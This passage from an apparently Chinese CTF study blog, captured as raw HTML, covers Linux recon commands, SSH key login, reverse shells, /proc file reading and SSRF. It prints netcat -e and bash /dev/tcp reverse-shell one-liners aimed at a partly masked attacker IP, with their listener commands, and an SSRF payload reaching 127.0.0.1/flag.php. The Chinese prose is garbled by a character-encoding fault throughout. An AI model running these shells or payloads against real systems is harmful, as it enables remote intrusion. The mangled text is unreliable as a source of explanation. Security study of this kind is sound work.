href="#ç³»ç»Ÿä¿¡æ¯ï¼ˆ-ï¼‰" class="headerlink" title="ç³»ç»Ÿä¿¡æ¯ï¼ˆ*ï¼‰"></a>ç³»ç»Ÿä¿¡æ¯ï¼ˆ*ï¼‰</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Â uname -a Â   //å¯ä»¥æ˜¾ç¤ºä¸€äº›é‡è¦çš„ç³»ç»Ÿä¿¡æ¯ï¼Œä¾‹å¦‚å†…æ ¸åç§°ã€ä¸»æœºåã€å†…æ ¸ç‰ˆæœ¬å·ã€å¤„ç†å™¨ç±»å‹ä¹‹ç±»çš„ä¿¡æ¯</span><br><span class="line">Â ps -ef Â  Â  Â  Â  //æŸ¥çœ‹æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹</span><br><span class="line">Â ps -aux Â  Â  //æ˜¾ç¤ºæ‰€æœ‰ç”¨æˆ·æ‰“å¼€çš„è¿›ç¨‹,åŒ…æ‹¬æ— æ§åˆ¶ç»ˆç«¯çš„è¿›ç¨‹ Â  å…¶ä¸­æœ‰å…¶ä»–ç”¨æˆ·çš„command</span><br><span class="line">Â ping IP Â  Â  Â   //æŸ¥çœ‹ä¸æ­¤IPåœ°å€çš„è¿æ¥æƒ…å†µ</span><br><span class="line">Â netstat -an Â   //æŸ¥çœ‹å½“å‰ç³»ç»Ÿç«¯å£</span><br><span class="line">Â netstat -an  grep 8080 Â  Â  //æŸ¥çœ‹æŒ‡å®šç«¯å£</span><br></pre></td></tr></table></figure><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â SSH ä¸º Secure Shell çš„ç¼©å†™ï¼Œç”± IETF çš„ç½‘ç»œå°ç»„ï¼ˆNetwork Working Groupï¼‰æ‰€åˆ¶å®šï¼›SSH ä¸ºå»ºç«‹åœ¨åº”ç”¨å±‚åŸºç¡€ä¸Šçš„å®‰å…¨åè®®ã€‚</span><br></pre></td></tr></table></figure><p>ä»å®¢æˆ·ç«¯æ¥çœ‹ï¼ŒSSHæä¾›ä¸¤ç§çº§åˆ«çš„<strong>å®‰å…¨éªŒè¯</strong>ã€‚</p><p><strong>ç”¨äºè¿œç¨‹ç™»å½•ä¸»æœº</strong></p><p><strong>ç¬¬ä¸€ç§çº§åˆ«ï¼ˆåŸºäºå£ä»¤çš„å®‰å…¨éªŒè¯ï¼‰</strong></p><p>åªè¦ä½ çŸ¥é“è‡ªå·±å¸å·å’Œå£ä»¤ï¼Œå°±å¯ä»¥ç™»å½•åˆ°è¿œç¨‹ä¸»æœºã€‚æ‰€æœ‰ä¼ è¾“çš„æ•°æ®éƒ½ä¼šè¢«åŠ å¯†ï¼Œä½†æ˜¯ä¸èƒ½ä¿è¯ä½ æ­£åœ¨è¿æ¥çš„æœåŠ¡å™¨å°±æ˜¯ä½ æƒ³è¿æ¥çš„[æœåŠ¡å™¨]ã€‚å¯èƒ½ä¼šæœ‰åˆ«çš„æœåŠ¡å™¨åœ¨å†’å……çœŸæ­£çš„æœåŠ¡å™¨ï¼Œä¹Ÿå°±æ˜¯å—åˆ°â€œä¸­é—´äººâ€è¿™ç§æ–¹å¼çš„æ”»å‡»ã€‚</p><p><strong>ç¬¬äºŒç§çº§åˆ«ï¼ˆåŸºäºå¯†åŒ™çš„å®‰å…¨éªŒè¯ï¼‰</strong></p><p><strong>éå¯¹ç§°åŠ å¯†</strong></p><p>éœ€è¦ä¾é <strong>å¯†åŒ™</strong>ï¼Œä¹Ÿå°±æ˜¯ä½ å¿…é¡»ä¸ºè‡ªå·±åˆ›å»ºä¸€å¯¹å¯†åŒ™ï¼Œå¹¶æŠŠå…¬ç”¨å¯†åŒ™æ”¾åœ¨éœ€è¦è®¿é—®çš„æœåŠ¡å™¨ä¸Šã€‚å¦‚æœä½ è¦è¿æ¥åˆ°SSHæœåŠ¡å™¨ä¸Šï¼Œå®¢æˆ·ç«¯è½¯ä»¶å°±ä¼šå‘æœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œè¯·æ±‚ç”¨ä½ çš„å¯†åŒ™è¿›è¡Œå®‰å…¨éªŒè¯ã€‚æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚ä¹‹åï¼Œå…ˆåœ¨è¯¥æœåŠ¡å™¨ä¸Šä½ çš„ä¸»ç›®å½•ä¸‹å¯»æ‰¾ä½ çš„å…¬ç”¨å¯†åŒ™ï¼Œç„¶åæŠŠå®ƒå’Œä½ å‘é€è¿‡æ¥çš„å…¬ç”¨å¯†åŒ™è¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœä¸¤ä¸ªå¯†åŒ™ä¸€è‡´ï¼ŒæœåŠ¡å™¨å°±ç”¨å…¬ç”¨å¯†åŒ™åŠ å¯†â€œè´¨è¯¢â€ï¼ˆchallengeï¼‰å¹¶æŠŠå®ƒå‘é€ç»™å®¢æˆ·ç«¯è½¯ä»¶ã€‚å®¢æˆ·ç«¯è½¯ä»¶æ”¶åˆ°â€œè´¨è¯¢â€ä¹‹åå°±å¯ä»¥ç”¨ä½ çš„ç§äººå¯†åŒ™è§£å¯†å†æŠŠå®ƒå‘é€ç»™æœåŠ¡å™¨ã€‚</p><p>ç”¨è¿™ç§æ–¹å¼ï¼Œä½ å¿…é¡»çŸ¥é“è‡ªå·±å¯†åŒ™çš„<a href="https://baike.baidu.com/item/%E5%8F%A3%E4%BB%A4?fromModule=lemma_inlink">å£ä»¤</a>ã€‚ä½†æ˜¯ï¼Œä¸ç¬¬ä¸€ç§çº§åˆ«ç›¸æ¯”ï¼Œç¬¬äºŒç§çº§åˆ«ä¸éœ€è¦åœ¨ç½‘ç»œä¸Šä¼ é€å£ä»¤ã€‚</p><p>ç¬¬äºŒç§çº§åˆ«ä¸ä»…åŠ å¯†æ‰€æœ‰ä¼ é€çš„æ•°æ®ï¼Œè€Œä¸”â€œä¸­é—´äººâ€è¿™ç§æ”»å‡»æ–¹å¼ä¹Ÿæ˜¯ä¸å¯èƒ½çš„ï¼ˆå› ä¸ºä»–æ²¡æœ‰ä½ çš„ç§äººå¯†åŒ™ï¼‰ã€‚ä½†æ˜¯æ•´ä¸ªç™»å½•çš„è¿‡ç¨‹å¯èƒ½éœ€è¦10ç§’ ã€‚</p><h4 id="å…¬é’¥ç™»å½•"><a href="#å…¬é’¥ç™»å½•" class="headerlink" title="å…¬é’¥ç™»å½•"></a>å…¬é’¥ç™»å½•</h4><p>1.æœåŠ¡å™¨ç”Ÿæˆå…¬ç§é’¥å¯¹ï¼ˆæœ‰äº›æœåŠ¡å™¨å¼€æœºè‡ªèµ·ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Â # cd</span><br><span class="line">Â # ssh-keygen</span><br></pre></td></tr></table></figure><p>2.å°†å…¬é’¥å¯¼å…¥authorized_keysæ–‡ä»¶,å¹¶å°†ç§é’¥ä¿å­˜åˆ°æœ¬åœ°è®¡ç®—æœº</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Â # cat id_rsa.pub &gt;&gt;authorized_keys</span><br><span class="line">Â # cat authorized_keys</span><br></pre></td></tr></table></figure><p>id_rsa, id_rua.pub, authorized_keys éƒ½åœ¨ ~&#x2F;.sshç›®å½•ä¸‹ï¼ˆsshæ˜¯ç”¨æˆ·ç›®å½•ä¸‹çš„<strong>éšè—æ–‡ä»¶</strong>ï¼‰</p><p>3.ä¿®æ”¹sshé…ç½®æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â # vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><p>4.é‡å¯sshdæœåŠ¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Â // centosç³»ç»Ÿ</span><br><span class="line">Â # systemctl restart sshd.service</span><br><span class="line">Â // ubuntuç³»ç»Ÿ</span><br><span class="line">Â # /etc/init.d/sshd restart</span><br></pre></td></tr></table></figure><h6 id="5-è¿œç¨‹ç™»å½•"><a href="#5-è¿œç¨‹ç™»å½•" class="headerlink" title="5.è¿œç¨‹ç™»å½•"></a>5.è¿œç¨‹ç™»å½•</h6><p>1.xshellç™»å½•ï¼ˆåŠè‡ªåŠ¨åŒ–ï¼‰</p><p>2.å‘½ä»¤ç™»å½•</p><p>ä¿®æ”¹æƒé™ï¼Œ<strong>æƒé™ä¸ä¿®æ”¹æˆ600å¯èƒ½ä¼šå¯¼è‡´ç™»å½•å¤±è´¥</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Â # chmod 600 id_rsa</span><br><span class="line">Â â€‹</span><br><span class="line">Â # ssh root@[ip] -p[port] -i id_rsa</span><br><span class="line">Â e.g:  ssh -i /home/cnss/.ssh/id_cnss -o StrictHostKeyChecking=no cnss@192.168.98.104</span><br><span class="line">Â //StrictHostKeyChecking=no Â  åŠ å…¥æ­¤å‘½ä»¤ï¼Œå®ç°ä¸€ä¸ªéäº¤äº’æ–¹å¼ç™»å½•ï¼ˆé¢˜ç›®ç¯å¢ƒéœ€è¦ï¼‰</span><br><span class="line">Â //192.168.98.104æ˜¯è¦ç™»å½•çš„ä¸»æœºçš„ipï¼Œcnss@cnss_feedback_nginx</span><br></pre></td></tr></table></figure><h3 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h3><p>å¯¹linuxæœåŠ¡å™¨çš„[æ¸—é€æµ‹è¯•]è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬åœ¨getshellå¾—åˆ°ä¸€ä¸ªä½æƒé™çš„webshellåï¼Œç”±äºwebshellæ˜¯<strong>éäº¤äº’å¼</strong>shellï¼Œé€šå¸¸è¦åå¼¹ä¸€ä¸ª<strong>äº¤äº’å¼</strong>çš„shellï¼Œç„¶åè¿›ä¸€æ­¥è¿›è¡Œææƒã€‚</p><p>åå¼¹shellï¼Œå°±æ˜¯æ”»å‡»æœºç›‘å¬åœ¨æŸä¸ªTCP&#x2F;UDPç«¯å£ä¸ºæœåŠ¡ç«¯ï¼Œ<strong>ç›®æ ‡æœºä¸»åŠ¨å‘èµ·è¯·æ±‚åˆ°æ”»å‡»æœºç›‘å¬çš„ç«¯å£</strong>ï¼Œå¹¶å°†å…¶å‘½ä»¤è¡Œçš„<strong>è¾“å…¥è¾“å‡º</strong>è½¬åˆ°æ”»å‡»æœºã€‚</p><p>å…³é”®æ˜¯ç›®æ ‡æœºæœ‰ä¸€ä¸ªæ“ä½œæ¡ä»¶ï¼Œå¯ä»¥ä¸»åŠ¨å‘èµ·è¯·æ±‚ï¼Œå¹¶ä¸”è¦èƒ½å¤Ÿ<strong>è®¿é—®å¤–ç½‘</strong>ï¼Œç›®æ ‡æœºéœ€è¦æ˜¯åˆ«äººéƒ½èƒ½è®¿é—®çš„å¤–ç½‘</p><p>ä¸‹é¢ä»‹ç»å‡ ç§æ–¹å¼</p><h6 id="netcatåå¼¹"><a href="#netcatåå¼¹" class="headerlink" title="netcatåå¼¹"></a><strong>netcatåå¼¹</strong></h6><p>Netcat æ˜¯ä¸€æ¬¾ç®€å•çš„Unixå·¥å…·ï¼Œä½¿ç”¨UDPå’ŒTCPåè®®ã€‚å®ƒæ˜¯ä¸€ä¸ªå¯é çš„å®¹æ˜“è¢«å…¶ä»–ç¨‹åºæ‰€å¯ç”¨çš„åå°æ“ä½œå·¥å…·ï¼ŒåŒæ—¶å®ƒä¹Ÿè¢«ç”¨ä½œç½‘ç»œçš„æµ‹è¯•å·¥å…·æˆ–é»‘å®¢å·¥å…·ã€‚ä½¿ç”¨å®ƒä½ å¯ä»¥è½»æ˜“çš„å»ºç«‹ä»»ä½•è¿æ¥ã€‚</p><p>ç›®å‰ï¼Œé»˜è®¤çš„å„ä¸ªlinuxå‘è¡Œç‰ˆæœ¬å·²ç»è‡ªå¸¦äº†netcatå·¥å…·åŒ…ï¼Œä½†æ˜¯å¯èƒ½ç”±äºå¤„äºå®‰å…¨è€ƒè™‘åŸç”Ÿç‰ˆæœ¬çš„netcatå¸¦æœ‰å¯ä»¥ç›´æ¥å‘å¸ƒä¸åå¼¹æœ¬åœ°shellçš„åŠŸèƒ½å‚æ•° -e éƒ½è¢«é˜‰å‰²äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è‡ªå·±æ‰‹åŠ¨ä¸‹è½½äºŒè¿›åˆ¶å®‰è£…åŒ…ï¼Œå®‰è£…çš„å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gztar -xvzf netcat-0.7.1.tar.gz./configuremake &amp;&amp; make installmake clean</span><br></pre></td></tr></table></figure><p>å®‰è£…å®ŒåŸç”Ÿç‰ˆæœ¬çš„ netcat å·¥å…·åï¼Œä¾¿æœ‰äº†netcat -eå‚æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†æœ¬åœ°bashåå¼¹åˆ°æ”»å‡»æœºä¸Šäº†ã€‚</p><p><strong>æ”»å‡»æœºå¼€å¯æœ¬åœ°ç›‘å¬ï¼š</strong></p><p>Â netcat -lvvp 2333</p><p><strong>ç›®æ ‡æœºä¸»åŠ¨è¿æ¥æ”»å‡»æœºï¼š</strong></p><p>Â netcat 47.xxx.xxx.72 2333 -e &#x2F;bin&#x2F;bash# nc &lt;æ”»å‡»æœºIP&gt; &lt;æ”»å‡»æœºç›‘å¬çš„ç«¯å£&gt; -e &#x2F;bin&#x2F;bash</p><h6 id="åˆ©ç”¨Bashåå¼¹shell"><a href="#åˆ©ç”¨Bashåå¼¹shell" class="headerlink" title="åˆ©ç”¨Bashåå¼¹shell"></a><strong>åˆ©ç”¨Bashåå¼¹shell</strong></h6><p>ä¸ªäººæ„Ÿè§‰åå¼¹shellæœ€å¥½ç”¨çš„æ–¹æ³•å°±æ˜¯ä½¿ç”¨bashç»“åˆé‡å®šå‘æ–¹æ³•çš„ä¸€å¥è¯ï¼Œå…·ä½“å‘½ä»¤å¦‚ä¸‹ï¼š</p><p><strong>ç›®æ ‡æœºä¸»åŠ¨è¿æ¥ä¸»æœºï¼š</strong></p><p>Â bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 0&gt;&amp;1 Â  Â  Â &#x2F;&#x2F;æˆ–è€…<br>Â bash -c â€œbash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 0&gt;&amp;1â€ Â  Â </p><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;æ”»å‡»æœºIP&#x2F;æ”»å‡»æœºç«¯å£ 0&gt;&amp;1 Â  </p><p>å»ºè®®ç”¨å¼•å·æ¥åŒ…è£¹bashå‘½ä»¤</p><p><strong>æ”»å‡»æœºå¼€å¯æœ¬åœ°ç›‘å¬ï¼š</strong></p><p>Â nc -lvvp 2333</p><h2 id="Mid-CNSS-Proxy"><a href="#Mid-CNSS-Proxy" class="headerlink" title="[Mid] CNSS Proxy"></a>[Mid] CNSS Proxy</h2><h3 id="proc-directory"><a href="#proc-directory" class="headerlink" title="proc directory"></a>proc directory</h3><h4 id="æ–‡ä»¶ç³»ç»Ÿ"><a href="#æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="æ–‡ä»¶ç³»ç»Ÿ"></a>æ–‡ä»¶ç³»ç»Ÿ</h4><p>ä¸€ç§æ–‡ä»¶ç³»ç»Ÿï¼Œä¸€ç§<strong>ä¼ªæ–‡ä»¶</strong>ç³»ç»Ÿï¼ˆä¹Ÿå³è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼‰ä¼ªæ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒåªå­˜åœ¨å†…å­˜å½“ä¸­ï¼Œè€Œä¸å ç”¨å¤–å­˜ç©ºé—´ã€‚å®ƒä»¥æ–‡ä»¶ç³»ç»Ÿçš„æ–¹å¼ä¸ºè®¿é—®ç³»ç»Ÿå†…æ ¸æ•°æ®çš„æ“ä½œæä¾›æ¥å£ã€‚</p><p>ç”±äºç³»ç»Ÿçš„ä¿¡æ¯ï¼Œå¦‚è¿›ç¨‹ï¼Œæ˜¯åŠ¨æ€æ”¹å˜çš„ï¼Œæ‰€ä»¥ç”¨æˆ·æˆ–åº”ç”¨ç¨‹åºè¯»å–procæ–‡ä»¶æ—¶ï¼Œprocæ–‡ä»¶ç³»ç»Ÿæ˜¯åŠ¨æ€ä»ç³»ç»Ÿå†…æ ¸è¯»å‡ºæ‰€éœ€ä¿¡æ¯å¹¶æäº¤çš„</p><p>ç”¨æˆ·å¯ä»¥é€šè¿‡è¿™äº›æ–‡ä»¶æŸ¥çœ‹æœ‰å…³<strong>ç³»ç»Ÿç¡¬ä»¶</strong>åŠå½“å‰æ­£åœ¨<strong>è¿è¡Œè¿›ç¨‹</strong>çš„ä¿¡æ¯ï¼Œç”šè‡³å¯ä»¥é€šè¿‡æ›´æ”¹å…¶ä¸­æŸäº›æ–‡ä»¶æ¥æ”¹å˜<strong>å†…æ ¸</strong>çš„è¿è¡ŒçŠ¶æ€ã€‚</p><p>è¿˜æœ‰çš„æ˜¯ä¸€äº›ä»¥æ•°å­—å‘½åçš„ç›®å½•ï¼Œå®ƒä»¬æ˜¯<strong>è¿›ç¨‹ç›®å½•</strong>ã€‚ç³»ç»Ÿä¸­å½“å‰è¿è¡Œçš„æ¯ä¸€ä¸ªè¿›ç¨‹éƒ½æœ‰å¯¹åº”çš„ä¸€ä¸ªç›®å½•åœ¨&#x2F;procä¸‹ï¼Œä»¥è¿›ç¨‹çš„ PIDå·ä¸ºç›®å½•åï¼Œå®ƒä»¬æ˜¯<strong>è¯»å–è¿›ç¨‹ä¿¡æ¯çš„æ¥å£</strong>ã€‚è€Œ<strong>self</strong>ç›®å½•åˆ™æ˜¯<strong>è¯»å–è¿›ç¨‹æœ¬èº«</strong>çš„ä¿¡æ¯æ¥å£ï¼Œæ˜¯ä¸€ä¸ªlinkã€‚</p><h4 id="å„ç§ç›®å½•"><a href="#å„ç§ç›®å½•" class="headerlink" title="å„ç§ç›®å½•"></a>å„ç§ç›®å½•</h4><p>&#x2F;proc&#x2F;<strong>cmdline</strong></p><p>è½½å…¥ kernel æ—¶æ‰€ä¸‹è¾¾çš„ç›¸å…³æŒ‡ä»¤ä¸å‚æ•°ï¼æŸ¥é˜…æ­¤æ–‡ä»¶ï¼Œå¯äº†è§£æŒ‡ä»¤æ˜¯å¦‚ä½•å¯åŠ¨çš„ï¼</p><p>ä¾‹å¦‚ï¼špythonloader.pyc ä¸­é—´ç©ºæ ¼è¢«çœç•¥æ‰äº†ï¼Œç”¨readlineèƒ½æŸ¥çœ‹å®Œæ•´çš„ã€‚ æ­¤è¯­å¥æ„æ€æ˜¯ç”¨pythonè¿è¡Œloader.pyc</p><p><strong>&#x2F;proc&#x2F;N&#x2F;environ</strong></p><p>è¿›ç¨‹ç¯å¢ƒå˜é‡åˆ—è¡¨</p><p>&#x2F;proc&#x2F;N&#x2F;<strong>exe</strong></p><p>exe æ˜¯ä¸€ä¸ªæŒ‡å‘å¯åŠ¨å½“å‰è¿›ç¨‹çš„<strong>å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆå®Œæ•´è·¯å¾„ï¼‰</strong>çš„ç¬¦å·é“¾æ¥ã€‚é€šè¿‡exeæ–‡ä»¶æˆ‘ä»¬å¯ä»¥è·å¾—æŒ‡å®šè¿›ç¨‹çš„å¯æ‰§è¡Œæ–‡ä»¶çš„å®Œæ•´è·¯å¾„</p><p><strong>&#x2F;proc&#x2F;maps</strong></p><p>å½“å‰è¿›ç¨‹å…³è”åˆ°çš„æ¯ä¸ª<strong>å¯æ‰§è¡Œæ–‡ä»¶å’Œåº“æ–‡ä»¶</strong>åœ¨å†…å­˜ä¸­çš„æ˜ å°„åŒºåŸŸåŠå…¶è®¿é—®æƒé™æ‰€ç»„æˆçš„åˆ—è¡¨</p><p>æ‰¾åˆ°&#x2F;appåçš„æ–‡ä»¶ï¼šapp.cpython-39-x86_64-linux-gnu.so</p><p>ç‰¹æ®Šæ ¼å¼ï¼š .soç»“å°¾ï¼Œæœ‰<strong>ç‰ˆæœ¬å·ä¿¡æ¯</strong></p><p><strong>&#x2F;proc&#x2F;N&#x2F;fd</strong></p><p>åŒ…å«è¿›ç¨‹ç›¸å…³çš„æ‰€æœ‰çš„<strong>æ–‡ä»¶æè¿°ç¬¦</strong></p><p>&#x2F;proc&#x2F;cpuinfo</p><p>æœ¬æœºçš„ <strong>CPU çš„ç›¸å…³ä¿¡æ¯</strong>ï¼ŒåŒ…å«<strong>é¢‘ç‡</strong>ã€<strong>ç±»å‹</strong>ä¸<strong>è¿ç®—åŠŸèƒ½</strong>ç­‰</p><p>&#x2F;proc&#x2F;modules</p><p>ç›®å‰æˆ‘ä»¬çš„ Linux å·²ç»è½½å…¥çš„<strong>æ¨¡å—åˆ—è¡¨</strong>ï¼Œä¹Ÿå¯ä»¥æƒ³æˆæ˜¯é©±åŠ¨ç¨‹åºå•¦ï¼</p><p>&#x2F;<strong>proc</strong>&#x2F;fb</p><p>å¸§ç¼“å†²è®¾å¤‡åˆ—è¡¨ï¼ŒåŒ…æ‹¬æ•°é‡å’Œæ§åˆ¶å®ƒçš„é©±åŠ¨</p><p>&#x2F;proc&#x2F;stat</p><p>ç³»ç»Ÿçš„ä¸€äº›çŠ¶æ€ä¿¡æ¯ï¼Œæ‰€æœ‰çš„CPUæ´»åŠ¨ä¿¡æ¯</p><p><strong>&#x2F;proc&#x2F;N&#x2F;cwd</strong></p><p>cwd æ–‡ä»¶æ˜¯ä¸€ä¸ªæŒ‡å‘å½“å‰è¿›ç¨‹è¿è¡Œç›®å½•çš„ç¬¦å·é“¾æ¥ã€‚å¯ä»¥é€šè¿‡æŸ¥çœ‹cwdæ–‡ä»¶è·å–ç›®æ ‡æŒ‡å®šè¿›ç¨‹ç¯å¢ƒçš„è¿è¡Œç›®å½•</p><p>app.cpython-39-x86_64-linux-gnu.so</p><p>cat &#x2F;proc&#x2F;N&#x2F;cwd&#x2F;filename</p><p>æ‰“å¼€è¿›ç¨‹å½“å‰<strong>è¿è¡Œæ–‡ä»¶</strong></p><h4 id="æ³¨æ„ï¼š"><a href="#æ³¨æ„ï¼š" class="headerlink" title="æ³¨æ„ï¼š"></a><strong>æ³¨æ„ï¼š</strong></h4><p>åœ¨çœŸæ­£åšé¢˜çš„æ—¶å€™ï¼Œæˆ‘ä»¬æ˜¯ä¸èƒ½é€šè¿‡å‘½ä»¤çš„æ–¹å¼æ‰§è¡Œé€šè¿‡catå‘½ä»¤è¯»å–cmdlineçš„ï¼Œå› ä¸ºå¦‚æœæ˜¯catè¯»å–&#x2F;proc&#x2F;self&#x2F;cmdlineçš„è¯ï¼Œå¾—åˆ°çš„æ˜¯catè¿›ç¨‹çš„ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é€šè¿‡é¢˜ç›®çš„å½“å‰è¿›ç¨‹ä½¿ç”¨è¯»å–æ–‡ä»¶ï¼ˆå¦‚<strong>æ–‡ä»¶åŒ…å«</strong>æ¼æ´ï¼Œæˆ–è€…<strong>SSTI</strong>ä½¿ç”¨<strong>fileæ¨¡å—</strong>ï¼Œ<strong>ssrf</strong>ï¼Œ<strong>ç›®å½•ç©¿è¶Š</strong>è¯»å–æ–‡ä»¶ï¼‰çš„æ–¹å¼è¯»å–&#x2F;proc&#x2F;self&#x2F;cmdlineã€‚</p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/f46efe060b8444df05d6aee5f2a9c87a.png" style="zoom:67%;" /><p>(Server-Side Request Forgery:<strong>æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ </strong>)</p><p>æ˜¯<strong>æ”»å‡»è€…</strong>è®©<strong>æœåŠ¡ç«¯å‘èµ·æ„é€ çš„æŒ‡å®šè¯·æ±‚</strong>é“¾æ¥é€ æˆçš„æ¼æ´ã€‚</p><p>é¦–å…ˆè¦çŸ¥é“å‡ºç°ssrfçš„å‡½æ•°åŸºæœ¬å°±è¿™å‡ ä¸ªfile_get_contents()ã€curl()ã€fsocksopen()ã€fopen()ï¼Œå¦‚æœè·å–åˆ°é¢˜ç›®æºç äº†ï¼Œæºç ä¸­å­˜åœ¨è¿™äº›ä¸ªå‡½æ•°å°±å¤§è‡´å¯ä»¥åˆ¤æ–­æ˜¯å¦æœ‰ssrfï¼Œå¦‚æœæ²¡æœ‰é¢˜ç›®çš„æºç ï¼Œssrfçš„å…¥å£ä¸€èˆ¬æ˜¯å‡ºç°åœ¨è°ƒç”¨å¤–éƒ¨èµ„æºçš„åœ°æ–¹ï¼Œæ¯”å¦‚urlæœ‰ä¸ªå‚æ•°è®©ä½ ä¼ æˆ–è€…æ˜¯åœ¨htmlä¸­çš„è¾“å…¥æ¡†ï¼Œç„¶åå°±ç”¨http:&#x2F;&#x2F;ï¼Œfile:&#x2F;&#x2F;ï¼Œdict:&#x2F;&#x2F;åè®®è¯»å–ä¸€ä¸‹ã€‚</p><p>SSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»[å¤–ç½‘]æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ï¼ˆæ­£æ˜¯å› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿï¼‰ å†…éƒ¨ç³»ç»Ÿä¸å¤–ç½‘éš”ç»ï¼Œä½†å´å’ŒæœåŠ¡å™¨ç›¸è¿ï¼ŒæœåŠ¡å™¨å¯ä»¥å¯¹å†…ç½‘å‘èµ·è¯·æ±‚ã€‚</p><p>ssrfå°±æ˜¯åˆ©ç”¨æˆ‘ä»¬å¯ä»¥è®¿é—®åˆ°çš„æœåŠ¡å™¨ï¼Œå¯¹å…¶æœåŠ¡å™¨ä¸‹é¢çš„å†…ç½‘è¿›è¡Œæ¢æµ‹ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºæœåŠ¡å™¨æ‹¥æœ‰å¤–ç½‘ipï¼Œè€Œæˆ‘ä»¬è¦è®¿é—®çš„ç”µè„‘åˆ™æ˜¯åœ¨å…¬ç½‘ipè¿›è¡Œnatååˆ†é…çš„å†…ç½‘ip</p><ul><li>1ã€å¯ä»¥å¯¹å¤–ç½‘ã€æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–ä¸€äº›æœåŠ¡çš„bannerä¿¡æ¯</li><li>2ã€æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„åº”ç”¨ç¨‹åºï¼ˆæ¯”å¦‚æº¢å‡ºï¼‰</li><li>3ã€å¯¹å†…ç½‘Webåº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œé€šè¿‡è®¿é—®é»˜è®¤æ–‡ä»¶å®ç°</li><li>4ã€æ”»å‡»å†…å¤–ç½‘çš„Webåº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨Getå‚æ•°å°±å¯ä»¥å®ç°çš„æ”»å‡»ï¼ˆæ¯”å¦‚Struts2æ¼æ´åˆ©ç”¨ï¼ŒSQLæ³¨å…¥ç­‰ï¼‰</li><li>5ã€åˆ©ç”¨fileåè®®è¯»å–æ–‡ä»¶</li></ul><h4 id="å†…ç½‘è®¿é—®"><a href="#å†…ç½‘è®¿é—®" class="headerlink" title="å†…ç½‘è®¿é—®"></a>å†…ç½‘è®¿é—®</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â /?url=127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><p>ç†è§£</p><p><strong>æ­£å¸¸è®¿é—®</strong></p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/6b5a90d895a54753b79e70121a3f53c3.png" style="zoom: 50%;" /><p><strong>åˆ©ç”¨ssrfæ¼æ´</strong></p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/bb49dd7a23e3425e9c42b257856edbd1-1024x363.png" style="zoom:50%;" 